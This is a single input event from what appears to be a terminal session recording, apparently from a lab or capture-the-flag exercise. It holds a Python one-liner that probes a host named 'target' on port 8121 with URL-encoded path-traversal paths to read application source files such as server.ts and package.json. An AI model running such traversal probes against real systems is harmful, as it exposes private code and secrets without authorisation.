[1457.521212, "i", "python3 -c '\nimport urllib.request\nfor root in [\"/examples/..%2f..%2f..%2fapp/\", \"/examples/%2e%2e/%2e%2e/%2e%2e/app/\", \"/examples/..%2f\", \"/examples/%2e%2e/\"]:\n    for f in [\"index.ts\", \"server.ts\", \"main.ts\", \"package.json\", \"bun.lockb\", \"app.ts\", \"src/index.ts\"]:\n        try:\n            r = urllib.request.urlopen(\"http://target:8121\" + root + f, timeout=1)\n            print(\"FOUND:\", root + f, r.status)\n            print(r.read()[:200])\n        except Exception:\n            pass\n'\n"]
